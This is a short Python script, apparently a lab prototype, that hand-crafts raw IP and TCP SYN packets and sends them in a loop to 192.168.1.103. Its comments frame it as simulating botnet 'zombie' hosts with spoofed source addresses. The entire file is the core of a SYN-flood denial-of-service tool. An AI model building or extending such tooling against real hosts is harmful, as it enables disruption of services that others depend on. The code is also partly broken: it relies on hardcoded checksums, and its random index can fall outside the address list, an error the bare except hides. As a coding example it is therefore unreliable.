import socket
import random
import time

def rip ():	# generating a random IP address '192.168.1.X'

	ip_pool = [b'\xC0\xA8\x01\x03', b'\xC0\xA8\x01\x99', b'\xC0\xA8\x01\x55', b'\xC0\xA8\x01\x42', b'\xC0\xA8\x01\x61']
	tmp = random.randint(0,5)
	return ip_pool[tmp]
number = 0
while True:

	try:
		tmp = rip()	# simulating a zombie system
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
		s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

		ip_header  = b'\x45\x00\x00\x28'  # Version, IHL, Type of Service | Total Length
		ip_header += b'\xab\xcd\x00\x00'  # Identification | Flags, Fragment Offset
		ip_header += b'\x40\x06\xa3\x5b'  # TTL, Protocol | Header Checksum a35b
		ip_header += b'\xC0\xA8\x02\x02'  # Source Address (random IP addresses representing a botnet)  for now for testing we only use our correct IP address instead of the IP pool. need to find a way to calculate checksum on the fly.
		ip_header += b'\xC0\xA8\x01\x67'  # Destination Address 192.168.1.103

		tcp_header  = b'\x30\x3B\x30\x3B' # Source Port | Destination Port
		tcp_header += b'\x00\x00\x00\x00' # Sequence Number
		tcp_header += b'\x00\x00\x00\x00' # Acknowledgement Number
		tcp_header += b'\x50\x02\x71\x10' # Data Offset, Reserved, Flags | Window Size /SYN set to 1
		tcp_header += b'\x59\xa2\x00\x00' # Checksum 59a2 | Urgent Pointer

		packet = ip_header + tcp_header
		s.sendto(packet, ('192.168.1.103', 0))
		number += 1
		#print(f'sent packet from {tmp} ' + str(number))
		print('sent a SYN packet')
		time.sleep(3)
	except Exception:
		pass
